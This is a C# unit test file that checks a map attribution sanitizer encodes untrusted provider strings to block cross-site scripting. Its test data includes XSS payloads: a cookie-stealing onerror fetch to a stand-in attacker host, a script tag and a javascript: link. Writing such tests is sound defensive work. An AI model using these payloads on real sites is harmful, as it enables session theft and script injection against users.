using OnaPlotter.Utilities;

namespace OnaPlotter.Tests;

/// <summary>
/// Pins the attribution-trust boundary that protects Leaflet's
/// AttributionControl (innerHTML sink) from a hostile or buggy SK
/// chart provider. A regression in <see cref="AttributionSanitizer"/>
/// would re-open an XSS surface in the WASM origin.
/// </summary>
public class AttributionSanitizerTests
{
    [Test]
    public async Task Sanitize_TrustedString_PassesThrough()
    {
        // Built-in OSM / OpenSeaMap entries hardcoded in the WASM
        // bundle ship with clickable ODbL credits. Trusted = pass
        // through unchanged so the link still renders.
        const string trusted = "<a href=\"https://x\" target=\"_blank\">© OSM</a>";

        var result = AttributionSanitizer.Sanitize(trusted, trusted: true);

        await Assert.That(result).IsEqualTo(trusted);
    }

    [Test]
    public async Task Sanitize_UntrustedString_AngleBracketsEncoded()
    {
        // SK-server-supplied attribution. The safety guarantee is that
        // <, >, ", ' are encoded so no <img> tag can form. The literal
        // text "onerror=" survives encoding (as a plain string outside
        // any tag), which is harmless: with no tag, it's just text.
        const string hostile = "<img src=x onerror=fetch('//attacker/'+document.cookie)>";

        var result = AttributionSanitizer.Sanitize(hostile, trusted: false);

        // No tag opening / closing -- innerHTML renders this as visible
        // text rather than an executing element.
        await Assert.That(result).DoesNotContain("<img");
        await Assert.That(result).DoesNotContain("</img");
        await Assert.That(result).Contains("&lt;img");
        // Quotes also encoded so an attribute couldn't smuggle a value
        // through if a future Leaflet variant un-escaped before render.
        await Assert.That(result).DoesNotContain("'");
    }

    [Test]
    public async Task Sanitize_UntrustedPlainAscii_PassesThroughReadably()
    {
        // The expected real-world SK-attribution value: a plain ASCII
        // credit. Round-trips visible so the helm sees what the
        // provider intended.
        const string plain = "(c) 2026 Acme Charts";

        var result = AttributionSanitizer.Sanitize(plain, trusted: false);

        await Assert.That(result).IsEqualTo("(c) 2026 Acme Charts");
    }

    [Test]
    public async Task Sanitize_UntrustedNonAscii_EncodedAsNumericEntity()
    {
        // WebUtility.HtmlEncode encodes non-ASCII as numeric character
        // references (e.g. © -> &#169;). Browsers render this as the
        // original glyph in textContent context -- the helm sees ©
        // visually -- but the source text shows the entity. Pin so a
        // future switch to a different encoder (which might leave
        // non-ASCII as raw UTF-8) is a visible test change rather
        // than a silent behaviour shift.
        const string plain = "© 2026 Acme Charts";

        var result = AttributionSanitizer.Sanitize(plain, trusted: false);

        await Assert.That(result).Contains("&#169;");
        await Assert.That(result).Contains("2026 Acme Charts");
    }

    [Test]
    public async Task Sanitize_UntrustedScriptTag_StrippedOfExecution()
    {
        const string hostile = "<script>alert(1)</script>";

        var result = AttributionSanitizer.Sanitize(hostile, trusted: false);

        await Assert.That(result).DoesNotContain("<script");
        await Assert.That(result).Contains("&lt;script");
    }

    [Test]
    [Arguments(null)]
    [Arguments("")]
    public async Task Sanitize_NullOrEmpty_ReturnsEmptyString(string? input)
    {
        // Null-safe so callers don't have to pre-guard. Empty string
        // out so the JS layer's `attribution || ''` idiom sees a
        // non-null value at the boundary.
        await Assert.That(AttributionSanitizer.Sanitize(input, trusted: false))
            .IsEqualTo("");
        await Assert.That(AttributionSanitizer.Sanitize(input, trusted: true))
            .IsEqualTo("");
    }

    [Test]
    public async Task Sanitize_UntrustedJavascriptUrl_EncodedSoLeafletWontFollow()
    {
        // A href with javascript: would execute on click even inside
        // an HTML-escaped context if a future Leaflet version chose
        // to unescape attribution before rendering. Encoding the
        // angle brackets stops the <a> tag from forming at all.
        const string hostile = "<a href=\"javascript:alert(1)\">click</a>";

        var result = AttributionSanitizer.Sanitize(hostile, trusted: false);

        await Assert.That(result).DoesNotContain("<a ");
        await Assert.That(result).Contains("&lt;a");
    }
}
